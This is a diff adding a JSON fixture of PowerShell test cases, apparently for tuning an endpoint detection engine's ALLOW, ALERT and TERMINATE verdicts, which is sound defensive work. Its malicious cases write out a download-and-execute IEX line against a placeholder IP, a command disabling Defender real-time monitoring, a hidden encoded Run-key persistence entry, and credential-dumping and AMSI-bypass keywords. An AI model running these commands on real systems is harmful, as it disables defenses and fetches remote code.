@@ -1,0 +1,233 @@
+[
+  {
+    "id": "VT-BEN-001",
+    "category": "benign_admin",
+    "name": "Locale and regional settings inventory",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-Culture; Get-WinSystemLocale",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Discovery-only locale checks are common admin behavior and should not terminate.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, cap isolated locale discovery at ALLOW unless paired with stronger indicators."
+  },
+  {
+    "id": "VT-BEN-002",
+    "category": "benign_admin",
+    "name": "Process inventory with Get-Process",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-Process | Select-Object -First 5 Name,Id,CPU",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Single process listing is normal troubleshooting activity.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, do not treat process discovery alone as malicious."
+  },
+  {
+    "id": "VT-BEN-003",
+    "category": "benign_admin",
+    "name": "Temporary directory listing",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name,Length",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Single directory listing in a user temp path is benign in isolation.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, separate benign file inventory from staged payload discovery."
+  },
+  {
+    "id": "VT-BEN-004",
+    "category": "benign_admin",
+    "name": "Service inventory",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-Service | Select-Object -First 5 Name,Status",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Service inventory is common helpdesk and system administration behavior.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, lower weight for inventory-only commands."
+  },
+  {
+    "id": "VT-BEN-005",
+    "category": "benign_admin",
+    "name": "Registry read for regional settings",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-ItemProperty 'HKCU:\\Control Panel\\International' | Select-Object LocaleName,sShortDate",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Registry read of user regional settings is benign discovery.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, distinguish registry read from registry persistence/write."
+  },
+  {
+    "id": "VT-BEN-006",
+    "category": "benign_admin",
+    "name": "Basic OS information",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-ComputerInfo | Select-Object WindowsProductName,OsVersion,CsName",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Basic OS inventory is benign when isolated.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, avoid treating all system information discovery as malicious."
+  },
+  {
+    "id": "VT-BEN-007",
+    "category": "benign_admin",
+    "name": "Local temp file write and cleanup",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; $p = Join-Path $env:TEMP '{{MARKER}}.txt'; Set-Content -Path $p -Value 'test'; Remove-Item -Path $p -ErrorAction SilentlyContinue",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Writing and removing a marker file in temp is normal automation behavior.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, scope destructive command detection by target path and context."
+  },
+  {
+    "id": "VT-SUS-101",
+    "category": "suspicious_obfuscation",
+    "name": "Encoded PowerShell command with benign payload",
+    "source": "process_sensor",
+    "process": "powershell.exe",
+    "script": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAEgAZQBsAGwAbwA=",
+    "expected_final_verdict": "ALERT",
+    "severity_policy": "EncodedCommand is suspicious but benign payload should not terminate by itself.",
+    "tuning_note": "If this becomes TERMINATE, require encoded command plus downloader, credential, persistence, AMSI bypass, or execution chain."
+  },
+  {
+    "id": "VT-SUS-102",
+    "category": "suspicious_obfuscation",
+    "name": "Base64 decode without execution",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgAEgAZQBsAGwAbwA='))",
+    "expected_final_verdict": "ALERT",
+    "severity_policy": "Base64 decoding is suspicious but no execution chain is present.",
+    "tuning_note": "If this becomes TERMINATE, separate decode-only from decode-and-execute."
+  },
+  {
+    "id": "VT-SUS-103",
+    "category": "suspicious_obfuscation",
+    "name": "Character array string reconstruction",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; $x = ([char]73)+([char]69)+([char]88); Write-Output $x",
+    "expected_final_verdict": "ALERT",
+    "severity_policy": "String reconstruction is suspicious but should not terminate without execution or payload.",
+    "tuning_note": "If this becomes TERMINATE, require reassembly plus Invoke-Expression or payload behavior."
+  },
+  {
+    "id": "VT-SUS-104",
+    "category": "suspicious_discovery",
+    "name": "Multiple discovery commands in one script",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-Process | Select -First 5; Get-ChildItem $env:USERPROFILE -ErrorAction SilentlyContinue | Select -First 5; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue",
+    "expected_final_verdict": "ALERT",
+    "severity_policy": "Multi-step discovery is more suspicious than isolated inventory, but still should not terminate alone.",
+    "tuning_note": "If this becomes TERMINATE, cap discovery-only chains at ALERT unless paired with execution, downloader, credential, or persistence."
+  },
+  {
+    "id": "VT-SUS-105",
+    "category": "suspicious_execution",
+    "name": "Hidden PowerShell window",
+    "source": "process_sensor",
+    "process": "powershell.exe",
+    "script": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Write-Output '{{MARKER}}'\"",
+    "expected_final_verdict": "ALERT",
+    "severity_policy": "Hidden execution is suspicious but benign payload should not terminate by itself.",
+    "tuning_note": "If this becomes TERMINATE, require hidden execution plus dangerous behavior."
+  },
+  {
+    "id": "VT-SUS-106",
+    "category": "suspicious_download",
+    "name": "Whitelisted source download without execution",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt' -OutFile (Join-Path $env:TEMP '{{MARKER}}.txt')",
+    "expected_final_verdict": "ALERT",
+    "severity_policy": "Remote download deserves visibility, but whitelisted source and no execution should not terminate.",
+    "tuning_note": "If this becomes TERMINATE, use whitelist and require download-execute chain for terminate."
+  },
+  {
+    "id": "VT-MAL-201",
+    "category": "malicious_credential",
+    "name": "Credential dumping keywords",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Write-Output 'mimikatz sekurlsa logonpasswords lsadump'",
+    "expected_final_verdict": "TERMINATE",
+    "severity_policy": "Credential dumping keywords are high-confidence malicious indicators.",
+    "tuning_note": "If this is not TERMINATE, strengthen credential dumping rules."
+  },
+  {
+    "id": "VT-MAL-202",
+    "category": "malicious_download_execute",
+    "name": "Download and execute chain",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.10/payload.ps1')",
+    "expected_final_verdict": "TERMINATE",
+    "severity_policy": "Downloader plus dynamic execution should terminate.",
+    "tuning_note": "If this is not TERMINATE, strengthen download-execute chain scoring."
+  },
+  {
+    "id": "VT-MAL-203",
+    "category": "malicious_amsi_bypass",
+    "name": "AMSI bypass indicators",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Write-Output 'AmsiUtils amsiInitFailed amsi fail'",
+    "expected_final_verdict": "TERMINATE",
+    "severity_policy": "AMSI bypass indicators are high-confidence malicious indicators.",
+    "tuning_note": "If this is not TERMINATE, strengthen AMSI bypass rules."
+  },
+  {
+    "id": "VT-MAL-204",
+    "category": "malicious_defense_evasion",
+    "name": "Defender tampering command",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Set-MpPreference -DisableRealtimeMonitoring $true",
+    "expected_final_verdict": "TERMINATE",
+    "severity_policy": "Attempting to disable Defender is a high-confidence defense evasion signal.",
+    "tuning_note": "If this is not TERMINATE, raise severity for Defender tampering commands."
+  },
+  {
+    "id": "VT-MAL-205",
+    "category": "malicious_persistence",
+    "name": "Hidden encoded persistence through Run key",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d \"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAEgAZQBsAGwAbwA=\" /f",
+    "expected_final_verdict": "TERMINATE",
+    "severity_policy": "Persistence plus hidden encoded PowerShell should terminate.",
+    "tuning_note": "If this is not TERMINATE, strengthen combined persistence and obfuscation policy."
+  },
+  {
+    "id": "VT-MAL-206",
+    "category": "malicious_memory_injection",
+    "name": "Memory injection API indicators",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Write-Output 'VirtualAlloc CreateThread GetProcAddress Marshal.Copy 0x40'",
+    "expected_final_verdict": "TERMINATE",
+    "severity_policy": "Memory injection API cluster is high-confidence malicious behavior.",
+    "tuning_note": "If this is not TERMINATE, strengthen memory injection API cluster scoring."
+  },
+  {
+    "id": "VT-BRD-301",
+    "category": "borderline_benign",
+    "name": "Secure credential object creation",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; $s = ConvertTo-SecureString 'placeholder' -AsPlainText -Force; New-Object System.Management.Automation.PSCredential('user', $s) | Out-Null",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "SecureString and PSCredential are common admin patterns and should not alert alone.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, lower benign credential-management weight unless paired with exfiltration or dumping."
+  },
+  {
+    "id": "VT-BRD-302",
+    "category": "borderline_suspicious",
+    "name": "Read event logs without clearing",
+    "source": "eventlog_4104_sensor",
+    "process": "powershell_eventlog",
+    "script": "Write-Output '{{MARKER}}'; Get-WinEvent -LogName System -MaxEvents 3 | Select-Object TimeCreated,Id",
+    "expected_final_verdict": "ALLOW",
+    "severity_policy": "Reading event logs is normal troubleshooting; clearing logs is malicious/suspicious.",
+    "tuning_note": "If this becomes ALERT/TERMINATE, distinguish Get-WinEvent from Clear-EventLog."
+  }
+]
